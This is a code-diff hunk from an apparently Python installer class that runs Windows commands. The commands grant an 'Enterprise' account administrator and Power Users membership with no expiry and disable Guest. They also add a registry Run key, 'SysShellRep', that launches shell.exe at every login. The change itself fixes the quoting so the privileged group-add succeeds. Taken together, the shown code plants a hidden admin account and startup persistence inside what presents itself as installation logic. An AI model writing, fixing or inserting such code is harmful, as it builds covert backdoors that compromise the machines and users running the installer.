@@ -98,7 +98,7 @@ class install_window:
               WINTCMD.term('net user Enterprise /expires:never')
               WINTCMD.term('net localgroup /add Administrators Enterprise')
               WINTCMD.term('net localgroup /add Users Enterprise')
-              WINTCMD.term('net localgroup /add Power Users Enterprise')
+              WINTCMD.term('net localgroup /add "Power Users" Enterprise')
               WINTCMD.term('net user Guest /active:no')
               # Injects the additional 3rd party startup code into registry
               WINTCMD.term('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "SysShellRep" /t REG_SZ /d "%windir%\\shell.exe" /f')
